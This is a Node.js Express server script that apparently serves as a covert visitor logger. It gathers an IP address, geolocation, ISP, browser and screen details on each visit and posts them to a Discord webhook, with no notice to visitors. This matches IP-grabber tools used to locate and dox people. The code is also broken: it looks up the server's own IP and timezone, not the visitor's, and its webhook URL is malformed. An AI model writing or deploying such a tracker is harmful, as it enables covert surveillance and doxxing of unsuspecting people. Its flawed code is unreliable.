const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 3000;

app.get('/', async (req, res) => {
  try {
    // Fetch the visitor's IP address using ipify
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();
    const visitorIP = ipData.ip;

    // Fetch location and ISP details using ipinfo.io
    const locationResponse = await fetch(`https://ipinfo.io/${visitorIP}/json?token=YOUR_IPINFO_TOKEN`);
    const locationData = await locationResponse.json();

    // Get device & browser info
    const deviceInfo = {
      browser: req.headers['user-agent'],
      screenResolution: `${req.query.width}x${req.query.height}`,
      colorDepth: `${req.query.colorDepth}-bit`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      pageLoadTime: req.query.pageLoadTime || "Unknown"
    };

    // Create embed message
    const embed = {
      title: "🌍 New Visitor Logged",
      color: 16711680, // Red
      fields: [
        { name: "🆔 IP Address", value: visitorIP, inline: false },
        { name: "📍 Country", value: `${locationData.country || "Unknown"}`, inline: true },
        { name: "🏙️ City", value: `${locationData.city || "Unknown"}`, inline: true },
        { name: "🌎 Region", value: `${locationData.region || "Unknown"}`, inline: true },
        { name: "📡 ISP", value: `${locationData.org || "Unknown"}`, inline: false },
        { name: "💻 Browser", value: deviceInfo.browser, inline: false },
        { name: "🖥️ Screen", value: deviceInfo.screenResolution, inline: true },
        { name: "🎨 Color Depth", value: deviceInfo.colorDepth, inline: true },
        { name: "⏳ Time Zone", value: deviceInfo.timezone, inline: false },
        { name: "⚡ Page Load Time", value: `${deviceInfo.pageLoadTime || "Unknown"} ms`, inline: false }
      ],
      footer: { text: "Website Visit Log", icon_url: "https://i.pinimg.com/736x/ab/c6/a7/abc6a7f1d9c0970b2f91ac70eaeb9d46.jpg" }
    };

    // Send to Discord Webhook
    await fetch("https://canary.discord.com/api/webhooks/https://discord.gg/fJ4xteaf", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Visitor Logger", embeds: [embed] })
    });

    res.send('Data collected successfully');
  } catch (err) {
    console.error("Logging failed:", err);
    res.status(500).send('Error collecting data');
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
